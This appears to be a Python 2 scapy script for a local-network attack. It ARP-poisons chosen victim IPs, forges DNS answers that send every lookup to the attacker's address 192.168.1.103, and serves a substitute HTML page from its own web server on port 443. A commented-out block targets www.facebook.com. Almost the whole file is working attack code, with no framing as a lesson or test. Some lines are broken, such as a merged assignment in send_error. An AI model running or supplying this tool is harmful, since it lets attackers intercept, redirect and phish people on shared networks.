from scapy.all import *
from BaseHTTPServer import BaseHTTPRequestHandler
from StringIO import StringIO
import sys
import socket
import os
import re

block_ip = []
send_page = None
gateway_ip = None
gateway_mac = None
my_mac = None

page_data = ""

is_blocked = False


class HTTPRequest(BaseHTTPRequestHandler):
	def __init__(self, request):
		self.rfile = StringIO(request)
		self.raw_requestline = self.rfile.readline()
		self.error_code = self.error_message = None
		self.parse_request()

	def send_error(self, code, message):
		self.error_code = codeself.error_message = message


def steal(packet):
	global is_blocked
	if packet[Ether].dst == gateway_mac:
		poison = ARP(op="who-has", hwdst = my_mac, psrc = gateway_ip, pdst = packet[IP].src)
		sendp(Ether() / poison, verbose = 0)
		is_blocked = False
		return False
	elif packet[Ether].dst == my_mac:
		if not is_blocked:
			print "Blocked %s's connection" % packet[IP].src
			is_blocked = True
		return True


last_seq = 0
last_ack = 0


PAGE = "brezeq.html"

HTTP = 80
HTTPS = 443
def openWebserver(pagetoSend=PAGE, port=HTTP):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.bind(('', port))
	except socket.error as msg:
		print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	file = open(pagetoSend,'r')
	page = file.read()

	s.listen(100)
	print "socket is listening"
	while 1:
		conn, addr = s.accept()
		data = conn.recv(2048)

		request = HTTPRequest(data)
		
		if request != None and request.command != None and "GET" in request.command:
			message = ["HTTP/1.1 200 OK", "Server: barlistener (Linux)"]
			if "imgs/" in request.path.lower():
				match = re.search(r"imgs\/.+",request.path).group()
				message += ["Content-Type: image/jpeg",
							"",
							open(match,'r').read()]
			else:
				message += ["Content-Type: text/html",
							"",
							page]	

		message_str = "\r\n".join(message)
		conn.send(message_str)
		print "page sent"
		conn.close()
	s.close()

def action(packet):
	global last_seq
	global last_ack

	SYN = 0x2
	ACK = 0x10

	#print "%s %s" % (packet[IP].dst, DNS in packet)
	if steal(packet):
		if UDP in packet and DNS in packet:
			odns = packet[DNS]
			dns = DNS(id=odns.id, ancount=1, qdcount=1, qr=1, opcode="QUERY", rd=1, ra=1, rcode="ok",
				an=DNSRR(rrname=odns.qd.qname, type='A', rdlen=4, rclass='IN', rdata="192.168.1.103", ttl=1234),
				qd=DNSQR(qname=odns.qd.qname, qtype='A', qclass='IN'))
			udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
			ip = IP(dst = packet[IP].src, src = packet[IP].dst)
			send(ip/udp/dns,verbose=0)
		#elif TCP in packet:
		#	dns = DNS(ancount=1, qdcount=1, qr=1, opcode="QUERY", rd=1, ra=1, rcode="ok",
		#		an=DNSRR(rrname="www.facebook.com.", type='A', rdlen=4, rclass='IN', rdata="192.168.1.103", ttl=1234),
		#		qd=DNSQR(qname="www.facebook.com.", qtype='A', qclass='IN'))
		#	udp = UDP(sport=packet[TCP].dport, dport=53)
		#	ip = IP(dst = packet[IP].src, src = packet[IP].dst)
		#	send(ip/udp/dns,verbose=0)
		#	print "Facebook"
	
				

def filterer(packet):
	return IP in packet and Ether in packet and packet[IP].src in block_ip



def main(argv):
	#{1. IP to block}{2. page to send}{3. my mac}{4. gateway mac}{5. gateway ip}
	print "script started"
	global block_ip
	global send_page
	global gateway_ip
	global gateway_mac
	global my_mac

	global page_data

	block_ip = argv[1].split(",")
	send_page = argv[2]
	gateway_ip = argv[5]
	my_mac = argv[3]
	gateway_mac = argv[4]

	f = os.fork()

	if f != 0:
		f = os.fork()
		if f != 0:
			openWebserver(PAGE, HTTPS)
		#else:
		#	openWebserver(PAGE, HTTPS)
	else:
		if len(argv) > 6:
			sniff(lfilter = filterer, prn = action, timeout = int(argv[6]))
			print "Stopped sniffing"
		else:
			sniff(lfilter = filterer, prn = action)
			print "Stopped sniffing"



main(sys.argv)


